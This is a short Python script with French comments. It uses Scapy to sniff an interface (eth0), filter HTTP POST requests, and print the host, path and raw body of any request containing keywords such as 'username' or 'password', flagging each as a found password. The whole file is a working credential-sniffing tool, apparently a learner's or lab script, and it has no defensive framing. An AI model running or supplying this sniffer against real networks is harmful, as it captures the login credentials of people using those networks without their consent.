from scapy.all import *
from scapy.layers.http import HTTPRequest

def sniff_packets(interface):
    print(f"[*] Sniffer en écoute sur {interface}...")
    # On ajoute filter="tcp" pour ne regarder que le web
    sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    try:
        # On récupère l'hôte et le chemin
        host = packet[HTTPRequest].Host.decode(errors="ignore")
        path = packet[HTTPRequest].Path.decode(errors="ignore")
        return host + path
    except:
        return "URL inconnue"

def get_login_info(packet):
    if packet.haslayer(Raw):
        try:
            load = packet[Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass", "uname"]
            for keyword in keywords:
                if keyword in load:
                    return load
        except:
            pass
    return None

def process_packet(packet):
    # On vérifie si le paquet contient une requête HTTP
    if packet.haslayer(HTTPRequest):
        try:
            # CORRECTION ICI : "Method" avec une majuscule !
            # Et on vérifie que le champ existe
            if packet[HTTPRequest].Method == b"POST":
                
                url = get_url(packet)
                login_info = get_login_info(packet)
                
                if login_info:
                    print("\n\n" + "-"*30)
                    print(f"[!!!] POTENTIEL MOT DE PASSE TROUVÉ !")
                    print(f"URL: {url}")
                    print(f"DONNÉES: {login_info}")
                    print("-"*30 + "\n")
        except Exception as e:
            # Si une erreur survient sur un paquet spécifique, on l'ignore et on continue
            pass

if __name__ == "__main__":
    # Assurez-vous que l'interface est bien eth0 (vérifiez avec ip a)
    sniff_packets("eth0")